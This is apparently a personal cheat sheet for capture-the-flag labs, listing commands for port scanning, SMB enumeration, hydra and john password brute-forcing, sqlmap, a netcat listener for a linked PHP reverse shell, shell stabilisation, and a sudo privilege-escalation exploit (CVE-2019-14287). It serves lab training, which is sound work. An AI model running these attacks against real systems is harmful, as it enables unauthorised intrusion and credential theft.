# Common CTF References

## Kali box setup
tryhackme virtual box do not have pip installed.
```
sudo apt install python3-pip
```

install gobuster as well
```
sudo apt-get install gobuster
```

- Install webapplyzer browser add on.
- Setup Burpsuite and foxyproxy.
- download impacket
```
git clone https://github.com/SecureAuthCorp/impacket.git
```

## OpenVPN Setup for THM
1. Install OpenVPN

```
sudo apt install openvpn
```

2. Run Openvpn

```
sudo openvpn /path-to-file/file-name.ovpn
```

## IP setup

note that in this script below, I made an assumption that you have assigned ```IP``` to the target's IP address:
```bash
export IP=<ip address>
```

## Nmap
Normal full port scan:
```bash
nmap -sC -sV -p- -oN <file directory> $IP
```

Nmap scanning samba ports:
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
```

Nmap scanning for vulnerability script:
```bash
nmap $IP --script=/usr/share/nmap/scripts/vulners.nse -sV
```

## Nikto
```bash
nikto -h $IP
```

##  Gobuster

Normal medium wordlist directory scan:
```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Scanning with extensions example ```php``` and ```txt```:
```bash
gobuster dir -u http://$IP -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .php,.txt
```

## Samba
Through Nmap:
```bash
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
```

Through enum4linux:
```bash
enum4linux -A $IP
```

Accessing Samba:
```bash
smbclient //$IP/[SHARE]
```

With user and port add:
```
-U [name] : to specify the user

-p [port] : to specify the port
```

## SSH with id_rsa
1. First you need to set the id_rsa permission first
```
chmod 600 id_rsa
```

2. Then try logging in with the id_rsa
```
ssh -i id_rsa <username>@<ipaddress>
```

3. If id_rsa is passcode protected you will need to run ```john``` to try decrypt the password (assuming weak passcode).
```
# make id_rsa readable to john format
/usr/share/john/ssh2john.py id_rsa > id_rsa.john

# bruteforce password with rockyou
sudo john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
```


## Telnet
Accessing Telnet:
```bash
telnet $IP [port]
```

## FTP
[FTP pentest article](https://book.hacktricks.xyz/pentesting/pentesting-ftp)

bruteforce works too:
```
hydra -t 4 -l <user> -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp

OR

root@kali:~/Downloads# ncrack --user "ftpuser" -P passwords.txt ftp://10.10.145.113
```

Simple FTP syntax
```
lcd <set your download directory>
get file
put file
mget *
mget *.txt
```

## Hydra Brute-Forcing
With known user and unknown password:
```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ssh://$IP
```

with unknown user and unknown password:
```bash
hydra -l /path/to/user/list -P /usr/share/wordlists/rockyou.txt ssh://$IP
```

force http-get
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt -s 3000 -f $IP http-get /<address>
```

## Sample Hashcat Brute-Forcing
```bash
hashcat -D 1 -m 1800 hash.txt /usr/share/wordlists/rockyou.txt --force
```
## Sample John The Ripper Brute-Forcing
```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

## SQLmap
```bash
sqlmap -u $IP
```

if you know the database type
```bash
sqlmap -u $IP --dbms==sqlite --dump
```

## Reverse Shell

[Pentestmonkey's php reverse shell] (https://github.com/pentestmonkey/php-reverse-shell)
-Remember to change the IP address and port in the php script

[Renaming reverse shell ext](https://d00mfist.gitbooks.io/ctf/content/bypass_image_upload.html)


## Netcat
```
nc -lvpn <port>
```

## Stablising Shell
- type the following:
```bash
python -c "import pty; pty.spawn('/bin/bash')"
```

OR

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

- press ```ctrl+z``` to bring shell to foreground

- type:
```bash
stty raw -echo
fg
```

- press ```Enter``` a few times to get back the shell

- type:
```bash
export TERM=xterm
```

- press ```crtl+l``` to get a clean and stable shell.

## Finding Exploit For Privilege Escalation

1. You can type ```sudo -l``` to see if any sudo permission is given.

2. you can use ```find / -perm -u=s -type f 2>/dev/null``` to find exploit files to run without ```sudo```. SUID bits can be dangerous, some binaries such as passwd need to be run with elevated privileges (as its resetting your password on the system), however other custom files could that have the SUID bit can lead to all sorts of issues.

3. you get find possible escalation scripts at [GTFObins](https://gtfobins.github.io/)

4. [CVE-2019-14287 user sudo -u#-1](https://www.whitesourcesoftware.com/resources/blog/new-vulnerability-in-sudo-cve-2019-14287/)
```
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
    
#you can run the following below as sudo
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```
```
User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/chmod

# you can run
sudo -u#-1 /usr/bin/chmod
```
- Follow GTFO to escalate the ```bin/sh```

## Recommended Burpsuite Additional Module Copy As Python-Requests
1. Go to ```Extender``` Tab
2. Under ```BApp Store``` Tab
3. Search for ```Copy As Python-Requests```
4. This allows you to change the get or post requests into a python format when you right click on the ```intercept``` response and choose ```Copy As Python-Requests```
5. Good for python scripting.
